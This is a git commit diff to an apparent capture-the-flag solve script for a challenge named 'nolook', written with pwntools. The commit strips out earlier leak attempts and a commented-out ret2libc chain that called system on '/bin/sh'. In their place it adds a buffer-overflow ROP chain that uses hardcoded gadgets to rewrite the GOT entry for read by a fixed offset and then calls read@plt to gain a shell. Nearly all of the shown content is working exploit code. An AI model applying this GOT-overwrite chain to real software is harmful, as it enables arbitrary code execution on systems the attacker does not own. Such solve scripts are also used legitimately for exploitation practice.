2912e100b2b7313c1c826560e877ff53861b227a
Xernary <nicolalggiuffrida@gmail.com>
2024-05-07 02:16:04 +0200

    idk

--- sw/nolook/solve.py
+++ sw/nolook/solve.py
@@ -26,36 +26,15 @@ def main():
 
     # good luck pwning :)
 
-    # ret addr at 26 bytes offset
-    read_got_addr = p64(exe.got["read"], endianness = 'little')
-    print(b'read.got. ' + read_got_addr)
-    print(b'got.read: ' + hexlify(read_got_addr))
-    print(b'main: ' + hexlify(p64(exe.symbols["main"], endianness = 'big')))
-    print(b'libc.read: ' + hexlify(p64(libc.symbols["read"], endianness = 'big')))
+    pop_r14_r15 = p64(0x0000000000400680)       # pop r14; pop r15; ret;
+    add_r14_0x90_r_15 = p64(0x00000000004005af) # add qword ptr [r14 + 0x90], r15; ret;
+    offset_read_gadget = p64(0xffffffffffffffff+1-0x5ce4)
+    print(offset_read_gadget)
+    got_read = p64(0x0000000000601018)
+    plt_read = p64(0x4004a0)
 
-    #print('libc_base_addr' + read_got_addr - read_plt_addr)
-
-   # payload = b'a'*25 + p64(exe.plt["read"], endianness = 'little') # p32(0x00000000004005a7) + b' '+  read_addr
-
-   # # first cycle
-    payload = b'a'*24 + p64(0x004005b7)
+    payload = b'a'*24 + pop_r14_r15 + p64(int.from_bytes(got_read, 'little') - 0x90) + offset_read_gadget + add_r14_0x90_r_15 + plt_read 
     r.send(payload)
-    print("FIRST CYCLE DONE")
-
-    # leak got.read addr
-
-
-
-   # shell_string_addr = 0x1b3e9a + libc.address
-   # system_addr = 0x000000000004f440 + libc.address
-
-   # print(b'shell_string_addr :' + p64(0x1b3e9a + libc.address)) #0x6A4E42
-   # print(b'system_addr :' + p64(0x000000000004f440 + libc.address)) #0x5403E8
-
-    # second cycle      # pop rdi; ret;              # "/bin/sh"                
-    payload = b'a'*24 #+ p64(libc.address + 834795) + p64(libc.address + 136543) + p64(libc.address + 1785498) + p64(libc.address + 324672) #+ p64(0x6A4E42)  #p64(0x004005b7)
-    r.send(payload)
-    print("SECOND CYCLE DONE")
 
     r.interactive()
 
